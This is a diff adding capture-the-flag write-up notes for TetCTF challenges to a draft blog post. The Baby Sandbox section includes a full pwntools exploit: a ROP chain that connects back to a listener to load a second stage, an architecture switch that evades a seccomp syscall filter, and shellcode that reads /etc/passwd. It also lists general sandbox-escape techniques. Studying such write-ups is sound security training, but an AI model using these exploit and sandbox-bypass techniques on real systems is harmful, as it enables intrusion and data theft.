@@ -4,10 +4,293 @@ date: 2019-01-01T13:34:45+07:00
 draft: true
 ---
 
+- [Web - IQTest2 (unsolved)](#TetCTF-IQTest2)
+- [Pwn - Easy webserver (unsolved)](#TetCTF-webserver)
+- [Pwn - Babysandbox](#TetCTF-babysandbox)
+- [Pwn - Babyheap](#TetCTF-babyheap)
+- [Pwn - Babyfirst](#TetCTF-babyfirst)
+
+# Web
+
+<a name="TetCTF-IQTest2"></a>
+
+## IQTest2
+
+- After looking at the source code, there is a path that we can polute the `$level` variable to pass. It has to pass several condition check:
+
+```php
+if (isset($_COOKIE['saved']) && !empty($_COOKIE['saved']) && isset($_COOKIE['hash']) && !empty($_COOKIE['hash']))
+{
+  $saved = base64_decode($_COOKIE["saved"]);
+  $seed = urldecode(substr($saved, 5 ));
+}
+
+if( md5($GLOBALS['secret'].$seed) === $_COOKIE['hash'] )
+{    
+  $level = $GLOBALS["seed_key"][$seed];
+  if ($level === NULL)
+  {
+    $saved = "level=i&".$saved;
+    $exp = explode("&", $saved);
+    foreach($exp as $value)
+    {
+      parse_str($value);
+    }
+  }
+  ...
+}
+```
+
+- For this to work:
+    - `$saved` gotta be `level=xiii` or something similar
+    - `$seed` must not match any valid seed so `$level` is null
+    - So previously `$saved` is `b64encode("level=xiii")` and so `$seed` is `=xiii`
+    - Which means `md5($GLOBAL['secret']."=xiii") === $_COOKIE['hash']`
+- But we also knows pairs of hashes/part of plaintext is the seed.
+
+    ```
+    f783148cc4750250969e3e1a0336aa43, c2VlZD10cnVl
+    997ca87069e58013ee1f499c348b686b, c2VlZD10c3U=
+    d81384d795a9f245b7b9081b70fd6dba, c2VlZD1iMG5n
+    dde85171daaf2508d5bb2ec2d0a2859e, c2VlZD1sMHYz
+    a42bb0f900169d78df68390bb4ce4690, c2VlZD1saXZl
+    e530da3436a296a64c95851ba57e22b3, c2VlZD1odWh1
+    b6f2505760fa81a262458eca297072db, c2VlZD1nZWdl
+
+    f783148cc4750250969e3e1a0336aa43
+    997ca87069e58013ee1f499c348b686b
+    d81384d795a9f245b7b9081b70fd6dba
+    dde85171daaf2508d5bb2ec2d0a2859e
+    a42bb0f900169d78df68390bb4ce4690
+    e530da3436a296a64c95851ba57e22b3
+    b6f2505760fa81a262458eca297072db
+    ```
+
 # Pwn
+
+<a name="TetCTF-webserver"></a>
+
+## Easy webserver
+
+- This is a webserver written in C/C++. It has several functionalities at the first glance
+    - login
+    - describe the challenge
+    - download server-side code and binary
+    - Process requests to the additional endpoints:
+        - /secret
+        - /login
+        - /info
+        - /chung96vn
+    - Some handle POST requests as well
+- This binary is complex because of C++ but I figured out that it uses asio library
+- Examining strings reveals responses to the requests. I was able to leak the admin password by sending a wrong password of length 0x100. Somehow this input is placed right before the actual admin password and the server echo the wrong password back, therefore leaking the admin password.
+- Logging in reveal more functionalities
+    - Submit a payload of (what seems like) an arbitrary length. The payload is placed in a file in `info/<ip>/<ip>.txt`
+    - GET request to the /info entry read the file and responds with it. However, this endpoint checks if the `ip` GET param starts with the IP address of the request. If it doesn't, the request is disregarded.
+- Tracing the binary and threads I was able to see what's passed into the functions and syscalls. It uses some like stat, openat. Attempt to do path traversal was not successful.
+- Maybe this is a race condition because it open files and write to it? What if we write different stuffs to the file multiple times in a short duration.
+- Yeah there was a race, but I'm not sure where to go from here.
+- Maybe the param to /info is read into a global buffer and it wasn't lock properly. So we can somehow cause a race to make the server open `secret/flag` while checking some path that starts with our IP?
+
+<a name="TetCTF-babysandbox"></a>
 
 ## Baby Sandbox
 
+- The program is just a simple stack buffer overflow. 64-bit, only NX so we can probably ROP. It's also statically linked so there is likely to be enough gadgets.
+- The sandbox has all protections on.
+- The following syscalls are filtered:
+    - 59: sys_execve
+    - 322: stub_execveat
+    - 2 with flag: sys_open
+    - 257 with flag: sys_openat
+    - 304 with flag: sys_open_by_handle_at
+    - 57: sys_fork
+    - 58: sys_vfork
+    - 56: sys_clone
+    - 86: sys_link
+    - 0xb: munmap in x64 and execve in x86
+- I ended up building a super dirty ROP chain to read more payload from another connection. That's the hardest part because of the limited payload length. After that, it's easy to make fixed memory segments executable and execute shellcode on that.
+- The interesting sandbox bypassing techniques I've learned while researching for this challenge:
+    - Change the architecture so the syscall number is different and won't be blacklisted.
+    - Kill the parent process
+    - Fork itself
+
+```python
+from __future__ import print_function
+from pwn import *
+import os
+
+GDBSCRIPT = """
+b * 0x400bcb
+"""
+HOST = 'sandbox.chung96vn.cf'
+PORT = 1337
+BIN = './program'
+#LIBC = './libc.so.6'
+addrs = {
+    'pushrsp': 0x450523,
+    'poprax': 0x4150d4,
+    'poprdi': 0x400686,
+    'subraxrdi': 0x4405b8,
+    'pushraxpoprbx': 0x488025,
+    'pushrbx': 0x44ad4f,
+    'poprdxpoprsi': 0x44b879,
+    'syscall': 0x4748a5,
+    'mprotect': 0x44a0c0,
+    'ret': 0x400bcb,
+    'poprsitordi': 0x446a5b,
+    'poprsi': 0x4100d3,
+    'addeax1': 0x474301,
+    'poprsp': 0x401d53,
+    'poprsi': 0x4100d3,
+    'poprdx': 0x44b856,
+    'adddhbl': 0x40058e,
+    'syscallpoprdxpoprsi': 0x44b877,
+    'movrsirbxsyscall': 0x047f52f
+}
+
+base = 0x6b6000
+
+if os.environ.has_key('remote'):
+    r = remote(HOST, PORT)
+else:
+    e = ELF(BIN)
+    r = process(["./sandbox", e.path]) #, env={'LD_PRELOAD': LIBC})
+
+if os.environ.has_key('debug'):
+    gdb.attach(r, gdbscript=GDBSCRIPT)
+
+def pivotstack():
+    # mprotect 0x1000 bytes starting at 0x6bc3f0
+    payload = ""
+#    payload += p64(addrs['poprdxpoprsi'])
+#    payload += p64(0x7)
+#    payload += p64(0x1000)
+    payload += p64(addrs['poprdi'])
+    payload += p64(base)
+#    payload += p64(addrs['mprotect'])
+    
+    # pop struct sockaddr_in
+    payload += p64(addrs['poprsi'])
+    payload += p64(0x0100007f5c110002)
+#    payload += p64(0x221fce125c110002)
+    payload += p64(addrs['poprsitordi'])
+
+    # open socket
+    payload += p64(addrs['poprax'])
+    payload += p64(0x29)
+    payload += p64(addrs['poprdxpoprsi'])
+    payload += p64(0)
+    payload += p64(1)
+    payload += p64(addrs['poprdi'])
+    payload += p64(2)
+    payload += p64(addrs['syscallpoprdxpoprsi'])       
+    
+    # connect
+    payload += p64(0x10)
+    payload += p64(base)
+    payload += p64(addrs['poprdi'])
+    payload += p64(0)
+    payload += p64(addrs['poprax'])
+    payload += p64(0x2a)
+    payload += p64(addrs['syscall'])
+
+    # read
+    payload += p64(addrs['poprdx'])
+    payload += p64(0x600)
+    payload += p64(addrs['syscall']) 
+
+    # pivot
+    payload += p64(addrs['poprsp'])
+    payload += p64(base)
+
+    return payload
+
+
+def realropchain():
+    payload = ""
+    
+    # Test write
+    payload += p64(addrs['poprax'])
+    payload += p64(1)
+    payload += p64(addrs['poprdx'])
+    payload += p64(0x50)
+    payload += p64(addrs['syscall'])
+
+    # mprotect 0x1000 bytes starting at 0x6bc3f0
+    payload = ""
+    payload += p64(addrs['poprdxpoprsi'])
+    payload += p64(0x7)
+    payload += p64(0x600)
+    payload += p64(addrs['poprdi'])
+    payload += p64(base)
+    payload += p64(addrs['poprax'])
+    payload += p64(10)
+    payload += p64(addrs['syscall'])
+
+    payload += p64(base + 0x50)
+    payload += '\x90' * 8
+
+    print(context.arch)
+    context.arch = 'amd64'
+    sc64 = """
+    mov DWORD PTR [rsp + 4], 0x23
+    mov DWORD PTR [rsp], {}
+    retf
+    """.format(base + 0x100)
+
+    payload += asm(sc64)
+    payload = payload.ljust(0x100, '\x90')
+    
+    context.clear()
+    sc32 = """
+    mov eax, 63
+    mov ebx, 1
+    xor ecx, ecx
+    int 0x80
+    mov eax, 63
+    mov ebx, 2
+    xor ecx, ecx
+    int 0x80
+    """
+    payload += asm(sc32)
+    payload += asm(shellcraft.i386.linux.readfile('/etc/passwd', 0))
+    #payload += asm(shellcraft.sh())
+    payload = payload.ljust(0x300, '\x90')
+    # Read map file
+#    payload = ""
+#    payload += p64(addrs['poprax'])
+#    payload += p64(39)
+#    payload += p64(addrs['syscall'])
+#
+#    payload += p64(addrs['pushraxpoprbx'])
+#    payload += p64(addrs['poprdi'])
+#    payload += p64(0x6bc700)
+#    payload += p64(addrs['movrsirbxsyscall'])
+    return payload
+
+def main():
+    l = listen(4444)
+    payload = 'A' * (8 * 7)
+    ropchain = pivotstack()
+    payload += ropchain
+    print("len payload = {}".format(len(payload)))
+    raw_input('pwn?')
+    r.sendline(payload)
+
+    payload = realropchain()
+    print("len payload 2 = {}".format(len(payload)))
+    l.sendline(payload)
+
+    #l.interactive()
+    r.interactive()
+    r.close()
+
+if __name__ == '__main__':
+    main()
+```
+
+<a name="TetCTF-babyheap"></a>
 
 ## Babyheap
 
@@ -562,6 +845,8 @@ if __name__ == '__main__':
     main()
 ```
 
+<a name="TetCTF-babyfirst"></a>
+
 ## Babyfirst
 
 - The binary has all protections on.
@@ -576,7 +861,7 @@ if __name__ == '__main__':
 - Play function:
     - It reads input of length 128 maximum and output it. This is stack overflow so we can leak the canary, binary base and libc base all in here.
     - After that, this can be a normal BoF challenge.
-    
+
 ```
 Before:
 0x0d60806019c93615	0xef683548a35d647c
